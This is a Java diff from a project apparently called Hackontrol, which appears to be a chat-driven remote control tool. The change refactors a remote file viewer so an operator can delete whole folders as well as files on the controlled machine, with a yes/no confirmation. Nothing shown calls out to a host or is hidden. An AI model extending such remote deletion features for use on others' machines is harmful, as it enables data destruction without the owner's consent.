@@ -21,12 +21,12 @@ import com.khopan.hackontrol.manager.button.Question.OptionType;
 import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
 import com.khopan.hackontrol.manager.common.IThinkable;
 import com.khopan.hackontrol.manager.common.sender.IRepliable;
-import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
 import com.khopan.hackontrol.manager.common.sender.sendable.ISendableReply;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolFile;
 import com.khopan.hackontrol.utils.HackontrolFile.FileCountAndSize;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.ImageUtils;
 import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 
@@ -46,7 +46,7 @@ public class FileEmbedSender implements Runnable {
 		this.action = action;
 	}
 
-	private void questionDelete(QuestionResponse response, ISendable sender) {
+	private void questionDelete(QuestionResponse response, ButtonContext context) {
 		if(!QuestionResponse.POSITIVE_RESPONSE.equals(response)) {
 			return;
 		}
@@ -54,9 +54,12 @@ public class FileEmbedSender implements Runnable {
 		String path = this.root.getAbsolutePath();
 		Hackontrol.LOGGER.info("Deleting '{}'", path);
 
-		if(!this.root.delete()) {
-			HackontrolError.message(sender, "Failed to delete '" + path + '\'');
+		if(!HackontrolFile.delete(this.root)) {
+			HackontrolError.message(context.message(), "Failed to delete '" + path + '\'');
+			return;
 		}
+
+		HackontrolMessage.delete(context);
 	}
 
 	private void buttonDownload(ButtonContext context) {
@@ -94,7 +97,7 @@ public class FileEmbedSender implements Runnable {
 			return;
 		}
 
-		Question.create(context.reply(), "Are you sure you want to delete '" + this.root.getAbsolutePath() + "'?", OptionType.YES_NO, response -> this.questionDelete(response, context.message()));
+		Question.create(context.reply(), "Are you sure you want to delete '" + this.root.getAbsolutePath() + "'?", OptionType.YES_NO, response -> this.questionDelete(response, context));
 	}
 
 	private boolean checkFileExistence(ISendableReply reply) {
@@ -143,11 +146,7 @@ public class FileEmbedSender implements Runnable {
 		}
 
 		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Open", this :: buttonOpen));
-
-		if(hasFileButton) {
-			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete File", this :: buttonDeleteFile));
-		}
-
+		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete " + (hasFileButton ? "File" : "Folder"), this :: buttonDeleteFile));
 		buttonList.add(HackontrolButton.delete());
 		messageBuilder.addActionRow(buttonList);
 		Hackontrol.LOGGER.info("File Viewer: '{}'", this.root.getAbsolutePath());
